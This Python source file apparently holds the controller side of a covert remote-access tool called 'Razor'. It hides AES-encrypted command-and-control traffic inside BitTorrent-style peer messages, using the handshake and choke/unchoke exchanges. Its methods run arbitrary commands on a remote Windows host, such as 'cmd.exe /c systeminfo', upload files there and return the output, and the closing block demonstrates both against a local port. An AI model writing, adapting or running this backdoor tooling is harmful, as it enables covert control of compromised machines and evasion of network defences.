from client import TortunClient
import hashlib
from razor.payload import RunCommand, BLOCK_SIZE, UploadFile
from razor.encryptor import AESCipher
import os


class RazorClient(TortunClient):

    def __init__(self, info_hash, enc_key):
        super(RazorClient, self).__init__(info_hash)
        self.enc_key = enc_key
        self.enc = None

    def initiate_session(self):
        self.bitfield_handshake()
        self.enc = AESCipher(self.enc_key, self.nonce)

    def _reject_last_request(self):
        msg = self.read_message()
        self.reject_request(msg)

    def _wait_for_unchoke(self):
        msg = self.read_message()

    def _initiate_sending(self):
        self.unchoke()

    def send_buffer(self, buf):
        buf = self.enc.encrypt(buf)
        self.send_sequence(buf)

    def _finalize_sending(self):
        self.choke()
        self._reject_last_request()

    def read_buffer(self):
        buf = self.receive_output(self.enc)
        return buf

    def exec(self, executable, params=""):
        payload = RunCommand(executable, params).to_razor_payload()
        self._initiate_sending()
        self.send_buffer(payload)
        self._wait_for_unchoke()
        self._finalize_sending()
        cmd_out = self.read_buffer()
        return cmd_out.decode('utf-8')

    def upload_file(self, local_path, remote_path):
        chunk_size = int((BLOCK_SIZE - 24) / 2.5)
        chunk_count = int(os.path.getsize(local_path) / chunk_size) + 1
        self._initiate_sending()
        with open(local_path, 'rb') as local_file:
            for i in range(chunk_count):
                chunk = local_file.read(chunk_size)
                payload = UploadFile(remote_path, chunk, append=bool(i)).to_razor_payload()
                self.send_buffer(payload)
        self._finalize_sending()


if __name__ == '__main__':
    h = hashlib.sha1()
    h.update(b"tomer")
    h = hashlib.sha256()
    h.update(b"key")
    r = RazorClient(h.digest(), enc_key=h.digest())
    r.connect(("127.0.0.1", 6888))
    r.initiate_session()
    r.upload_file(r"C:\users\defsa\pictures\test.jpg", r"C:\users\defsa\pictures\test2.jpg")
    print(r.exec("cmd.exe", r"/c systeminfo"))
